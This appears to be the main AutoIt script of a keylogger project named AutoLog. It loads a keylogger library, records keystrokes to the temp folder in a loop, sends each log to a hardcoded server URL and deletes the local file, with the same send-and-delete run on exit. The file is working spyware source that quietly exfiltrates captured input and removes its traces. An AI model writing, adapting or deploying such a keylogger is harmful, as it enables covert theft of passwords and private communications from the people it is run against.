; This is the standard-exe for AutoLog
; All Reports about Bugs and Tests are refering to THIS implementation of the keylogger

#include <Keylogger.au3>

OnAutoItExitRegister("lastAction")
OnAutoItExitUnRegister("lastAction")
Global $MY_URL = "http://myserver.my/"

While 1
	_init(@TempDir)
	_readFor(2000)
	_send($MY_URL)
	_deleteFile()
WEnd

Func lastAction()
	_send($MY_URL)
	_deleteFile()
EndFunc
